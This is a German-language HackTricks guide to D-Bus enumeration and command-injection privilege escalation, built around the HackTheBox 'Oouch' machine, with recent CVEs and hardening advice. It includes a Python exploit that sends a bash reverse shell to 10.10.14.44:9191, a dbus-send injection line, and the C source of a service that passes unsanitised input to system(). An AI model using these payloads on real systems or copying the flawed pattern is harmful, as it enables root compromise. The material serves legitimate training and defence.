# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus wird als Vermittler für Inter-Prozess-Kommunikation (IPC) in Ubuntu-Desktopumgebungen verwendet. Auf Ubuntu wird der gleichzeitige Betrieb mehrerer Message-Busse beobachtet: der System-Bus, der primär von **privileged services verwendet wird, um systemweit relevante Dienste bereitzustellen**, und ein Session-Bus für jeden angemeldeten Benutzer, der nur für diesen spezifischen Benutzer relevante Dienste bereitstellt. Der Fokus liegt hier vor allem auf dem System-Bus aufgrund seiner Verbindung mit Diensten, die mit höheren Privilegien laufen (z. B. root), da unser Ziel ist, Privilegien zu eskalieren. Es ist zu beachten, dass die Architektur von D-Bus pro Session-Bus einen 'router' verwendet, der dafür verantwortlich ist, Client-Nachrichten an die passenden Dienste weiterzuleiten, basierend auf der von den Clients angegebenen Adresse für den Dienst, mit dem sie kommunizieren möchten.

Dienste auf D-Bus sind durch die von ihnen bereitgestellten **objects** und **interfaces** definiert. Objects kann man mit Klasseninstanzen in standardmäßigen OOP-Sprachen vergleichen, wobei jede Instanz eindeutig durch einen **object path** identifiziert wird. Dieser Pfad, ähnlich einem filesystem path, identifiziert jedes vom Dienst bereitgestellte object eindeutig. Eine wichtige Schnittstelle für Forschungszwecke ist die **org.freedesktop.DBus.Introspectable**-Schnittstelle, die eine einzelne Methode, Introspect, enthält. Diese Methode gibt eine XML-Darstellung der vom object unterstützten methods, signals und properties zurück, wobei hier der Fokus auf methods liegt und properties sowie signals ausgelassen werden.

Für die Kommunikation mit der D-Bus-Schnittstelle wurden zwei tools verwendet: ein CLI-Tool namens **gdbus** für das einfache Aufrufen von Methoden, die von D-Bus in scripts bereitgestellt werden, und [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), ein Python-basiertes GUI-Tool, das dazu dient, die auf jedem bus verfügbaren services aufzulisten und die innerhalb jedes services enthaltenen objects anzuzeigen.
```bash
sudo apt-get install d-feet
```
Wenn du den **session bus** prüfst, bestätige zuerst die aktuelle Adresse:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Im ersten Bild sind die mit dem D-Bus system bus registrierten Services zu sehen, wobei **org.debin.apt** nach Auswahl des System Bus-Buttons speziell hervorgehoben ist. D-Feet fragt diesen Service nach Objekten ab und zeigt Interfaces, methods, properties und signals für ausgewählte Objekte an, wie im zweiten Bild zu sehen ist. Auch die Signatur jeder method wird detailliert angezeigt.

Eine bemerkenswerte Funktion ist die Anzeige der **process ID (pid)** und der **command line** des Services, nützlich, um zu bestätigen, ob der Service mit erhöhten Privilegien läuft, was für die Relevanz der Untersuchung wichtig ist.

**D-Feet erlaubt auch das Aufrufen von methods**: Benutzer können Python-Ausdrücke als Parameter eingeben, die D-Feet vor der Übergabe an den Service in D-Bus-Typen umwandelt.

Beachte jedoch, dass **einige methods eine Authentifizierung erfordern**, bevor wir sie aufrufen dürfen. Diese methods ignorieren wir, da unser Ziel ist, unsere Privilegien ohne Credentials überhaupt erst zu erhöhen.

Beachte auch, dass einige der Services einen anderen D-Bus-Service namens org.freedeskto.PolicyKit1 abfragen, ob ein Benutzer bestimmte Aktionen ausführen darf oder nicht.

## **Cmd line Enumeration**

### List Service Objects

Es ist möglich, geöffnete D-Bus-Interfaces mit Folgendem aufzulisten:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Dienste, die als **`(activatable)`** markiert sind, sind besonders interessant, weil sie **noch nicht laufen**, aber eine Bus-Anfrage sie bei Bedarf starten kann. Hör nicht bei `busctl list` auf; ordne diese Namen den tatsächlichen Binaries zu, die sie ausführen würden.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Das sagt dir schnell, welcher `Exec=`-Pfad für einen aktivierbaren Namen gestartet wird und unter welcher Identität. Wenn das Binary oder seine Ausführungskette schwach geschützt ist, kann ein inaktiver Service trotzdem zu einem privilege-escalation-Pfad werden.

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wenn ein Prozess eine Verbindung zu einem bus einrichtet, weist der bus der Verbindung einen speziellen bus name zu, der _unique connection name_ genannt wird. Bus names dieses Typs sind unveränderlich—es ist garantiert, dass sie sich nicht ändern, solange die Verbindung existiert—und, noch wichtiger, sie können während der Lebensdauer des bus nicht wiederverwendet werden. Das bedeutet, dass keine andere Verbindung zu diesem bus jemals einen solchen unique connection name zugewiesen bekommt, selbst wenn derselbe Prozess die Verbindung zum bus schließt und eine neue erstellt. Unique connection names sind leicht erkennbar, weil sie mit dem sonst verbotenen Doppelpunktzeichen beginnen.

### Service Object Info

Dann kannst du mit folgendem Befehl einige Informationen über die interface erhalten:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Ordne außerdem den Bus-Namen seinem `systemd`-Unit und dem ausführbaren Pfad zu:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Dies beantwortet die operative Frage, die während privesc wichtig ist: **Wenn ein Method-Call erfolgreich ist, welches reale Binary und welche unit führen die Aktion aus?**

### List Interfaces of a Service Object

Du brauchst ausreichende Berechtigungen.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspektiere die Schnittstelle eines Service-Objekts

Beachte, dass in diesem Beispiel die zuletzt entdeckte Schnittstelle mithilfe des `tree`-Parameters ausgewählt wurde (_siehe vorherigen Abschnitt_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Beachte die Methode `.Block` der Schnittstelle `htb.oouch.Block` (diejenige, an der wir interessiert sind). Das "s" der anderen Spalten könnte bedeuten, dass sie einen String erwartet.

Bevor du etwas Gefährliches ausprobierst, validiere zuerst eine **read-oriented** oder anderweitig risikoarme Methode. Dadurch lassen sich drei Fälle klar trennen: falsche Syntax, erreichbar aber verweigert, oder erreichbar und erlaubt.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### D-Bus-Methoden mit Policies und Actions korrelieren

Introspection sagt dir **was** du aufrufen kannst, aber nicht, **warum** ein Aufruf erlaubt oder verweigert wird. Für echtes privesc-Triage musst du normalerweise **drei Ebenen zusammen** prüfen:

1. **Activation-Metadaten** (`.service`-Dateien oder `SystemdService=`), um zu lernen, welcher Binary und welche Unit tatsächlich ausgeführt werden.
2. **D-Bus-XML-Policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`), um zu lernen, wer `own`, `send_destination` oder `receive_sender` darf.
3. **Polkit-Action-Dateien** (`/usr/share/polkit-1/actions/*.policy`), um das Default-Authorization-Modell zu lernen (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Nützliche Befehle:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Do **not** assume a 1:1 mapping between a D-Bus method and a Polkit action. The same method may choose a different action depending on the object being modified or on runtime context. Therefore the practical workflow is:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` and grep the relevant `.policy` files
3. low-risk live probes with `busctl call`, `gdbus call`, or `dbusmap --enable-probes --null-agent`

Proxy or compatibility services deserve extra attention. A **root-running proxy** that forwards requests to another D-Bus service over its own pre-established connection can accidentally make the backend treat every request as coming from UID 0 unless the original caller identity is re-validated.

### Monitor/Capture Interface

With enough privileges (just `send_destination` and `receive_sender` privileges aren't enough) you can **monitor a D-Bus communication**.

In order to **monitor** a **communication** you will need to be **root.** If you still find problems being root check [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) and [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> If you know how to configure a D-Bus config file to **allow non root users to sniff** the communication please **contact me**!

Different ways to monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
In dem folgenden Beispiel wird die Schnittstelle `htb.oouch.Block` überwacht und **die Nachricht "**_**lalalalal**_**" wird durch Miscommunication gesendet**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Du kannst `capture` anstelle von `monitor` verwenden, um die Ergebnisse in einer **pcapng**-Datei zu speichern, die Wireshark öffnen kann:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Filtern des ganzen Rauschens <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Wenn auf dem Bus einfach zu viele Informationen vorhanden sind, verwende eine Match-Regel wie diese:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Mehrere Regeln können angegeben werden. Wenn eine Nachricht _eine beliebige_ der Regeln erfüllt, wird die Nachricht ausgegeben. Zum Beispiel:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Siehe die [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) für weitere Informationen zur match rule syntax.

### More

`busctl` hat noch mehr Optionen, [**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

Als user **qtc inside the host "oouch" from HTB** kannst du eine **unexpected D-Bus config file** finden, die sich in _/etc/dbus-1/system.d/htb.oouch.Block.conf_ befindet:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Hinweis aus der vorherigen Konfiguration: **du musst der Benutzer `root` oder `www-data` sein, um Informationen** über diese D-BUS-Kommunikation zu senden und zu empfangen.

Als Benutzer **qtc** innerhalb des Docker-Containers **aeb4525789d8** kannst du in der Datei _/code/oouch/routes.py_ etwas dbus-bezogenen Code finden. Das ist der interessante Code:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Wie du sehen kannst, **verbindet es sich mit einer D-Bus-Schnittstelle** und sendet an die **"Block"-Funktion** die "client_ip".

Auf der anderen Seite der D-Bus-Verbindung läuft ein kompiliertes C-Binary. Dieser Code **lauscht** in der D-Bus-Verbindung **auf die IP-Adresse und ruft iptables über die `system`-Funktion auf**, um die angegebene IP-Adresse zu blockieren.\
**Der Aufruf von `system` ist absichtlich anfällig für command injection**, daher wird ein Payload wie der folgende eine reverse shell erzeugen: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Am Ende dieser Seite findest du den **vollständigen C-Code der D-Bus-Anwendung**. Darin kannst du zwischen den Zeilen 91-97 sehen, **wie der `D-Bus object path`** **und der `interface name`** registriert werden. Diese Information wird notwendig sein, um Informationen an die D-Bus-Verbindung zu senden:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Auch in Zeile 57 kannst du sehen, dass **die einzige registrierte Methode** für diese D-Bus-Kommunikation `Block` heißt(_**Deshalb werden im folgenden Abschnitt die Payloads an das Service-Objekt `htb.oouch.Block`, die Interface `/htb/oouch/Block` und den Methodennamen `Block` gesendet**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Der folgende Python-Code sendet das Payload über die D-Bus-Verbindung an die `Block`-Methode via `block_iface.Block(runme)` (_beachte, dass es aus dem vorherigen Code-Abschnitt extrahiert wurde_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl und dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` ist ein Tool, das verwendet wird, um eine Nachricht an den “Message Bus” zu senden
- Message Bus – Eine Software, die von Systemen verwendet wird, um die Kommunikation zwischen Anwendungen zu erleichtern. Sie hängt mit Message Queue zusammen (Nachrichten sind in einer Sequenz geordnet), aber beim Message Bus werden die Nachrichten in einem Subscription-Modell gesendet und außerdem sehr schnell.
- Das Tag “-system” wird verwendet, um anzugeben, dass es sich um eine Systemnachricht handelt, nicht um eine Session-Nachricht (standardmäßig).
- Das Tag “–print-reply” wird verwendet, um unsere Nachricht korrekt auszugeben und Antworten in einem menschenlesbaren Format zu erhalten.
- “–dest=Dbus-Interface-Block” Die Adresse der Dbus-Interface.
- “–string:” – Typ der Nachricht, die wir an die Schnittstelle senden möchten. Es gibt mehrere Formate zum Senden von Nachrichten wie double, bytes, booleans, int, objpath. Davon ist der “object path” nützlich, wenn wir einen Pfad einer Datei an die Dbus-Interface senden wollen. In diesem Fall können wir eine spezielle Datei (FIFO) verwenden, um einen Befehl im Namen einer Datei an die Schnittstelle zu übergeben. “string:;” – Dies wird verwendet, um den object path erneut aufzurufen, wo wir die FIFO reverse shell Datei/den Befehl platzieren.

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automatisierte Enumeration-Helpers (2023-2025)

Die manuelle Enumeration einer großen D-Bus-Angriffsfläche mit `busctl`/`gdbus` wird schnell mühsam. Zwei kleine FOSS-Utilities, die in den letzten Jahren veröffentlicht wurden, können bei Red-Team- oder CTF-Einsätzen helfen:

### dbusmap ("Nmap for D-Bus")
* Autor: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* In C geschrieben; einzelnes statisches Binary (<50 kB), das jeden object path durchläuft, das `Introspect` XML ausliest und es dem zugehörigen PID/UID zuordnet.
* Nützliche Flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Das Tool markiert ungeschützte well-known names mit `!` und zeigt sofort Services, die du *own*en (übernehmen) kannst, oder Methodenaufrufe, die von einer unprivilegierten Shell aus erreichbar sind.

### uptux.py
* Autor: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Reines Python-Skript, das nach *schreibbaren* Pfaden in systemd-Units **und** zu permissiven D-Bus-Policy-Dateien sucht (z. B. `send_destination="*"`).
* Schnelle Verwendung:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* Das D-Bus-Modul durchsucht die folgenden Verzeichnisse und hebt jeden Service hervor, der von einem normalen Benutzer gefälscht oder gekapert werden kann:
* `/etc/dbus-1/system.d/` und `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Bemerkenswerte D-Bus-Privilege-Escalation-Bugs (2024-2025)

Ein Auge auf kürzlich veröffentlichte CVEs zu haben, hilft dabei, ähnliche unsichere Muster in eigenem Code zu erkennen. Zwei gute aktuelle Beispiele sind:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Der als root laufende Dienst stellte eine D-Bus-Schnittstelle bereit, die unprivilegierte Benutzer neu konfigurieren konnten, einschließlich des Ladens von vom Angreifer kontrolliertem Makro-Verhalten. | Wenn ein Daemon **device/profile/config management** auf dem system bus anbietet, behandle schreibbare Konfiguration und Makro-Funktionen als Code-Execution-Primitiven und nicht nur als "settings". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Ein als root laufender Compatibility-Proxy leitete Anfragen an Backend-Services weiter, ohne den Sicherheitskontext des ursprünglichen Aufrufers beizubehalten, sodass die Backends dem Proxy als UID 0 vertrauten. | Behandle **proxy / bridge / compatibility** D-Bus-Services als separate Bug-Klasse: Wenn sie privilegierte Aufrufe weiterleiten, prüfe, wie caller UID/Polkit-Kontext das Backend erreicht. |

Muster, auf die man achten sollte:
1. Der Service läuft **als root auf dem system bus**.
2. Entweder gibt es **keine Authorization-Check**, oder der Check wird gegen das **falsche Subjekt** durchgeführt.
3. Die erreichbare Methode verändert am Ende den Systemzustand: Paketinstallation, Änderungen an Benutzer/Gruppen, Bootloader-Konfiguration, Geräteprofil-Updates, Dateischreibzugriffe oder direkte Kommandoausführung.

Verwende `dbusmap --enable-probes` oder manuell `busctl call`, um zu bestätigen, ob eine Methode erreichbar ist, und prüfe dann die Policy-XML des Services sowie die Polkit-Aktionen, um zu verstehen, **welches Subjekt** tatsächlich autorisiert wird.

---

## Hardening & Detection Quick-Wins

* Suche nach world-writable oder *send/receive*-offenen Policies:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Verlange Polkit für gefährliche Methoden – selbst *root*-Proxies sollten die *caller* PID an `polkit_authority_check_authorization_sync()` weitergeben statt ihre eigene.
* Entferne Privilegien in lang laufenden Helfern (verwende `sd_pid_get_owner_uid()`, um nach der Verbindung zum Bus Namespaces zu wechseln).
* Wenn du einen Service nicht entfernen kannst, dann zumindest auf eine dedizierte Unix-Gruppe *scopen* und den Zugriff in seiner XML-Policy einschränken.
* Blue-team: Erfasse den system bus mit `busctl capture > /var/log/dbus_$(date +%F).pcapng` und importiere ihn in Wireshark für Anomalie-Erkennung.

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
